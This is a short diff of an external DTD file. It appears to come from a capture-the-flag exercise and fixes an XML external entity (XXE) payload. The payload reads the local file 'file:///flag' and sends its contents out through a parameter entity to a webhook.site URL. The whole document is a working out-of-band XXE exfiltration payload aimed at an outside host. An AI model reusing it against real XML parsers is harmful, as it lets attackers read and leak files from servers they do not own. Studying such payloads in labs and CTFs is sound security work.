@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///flag">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/8a938f25-ccf5-494f-9c79-3c2c21a12792/leak?flag=%file;'>">
+<!ENTITY % all "<!ENTITY % send SYSTEM 'https://webhook.site/8a938f25-ccf5-494f-9c79-3c2c21a12792/leak?flag=%file;'>">
 %all;
 %send;
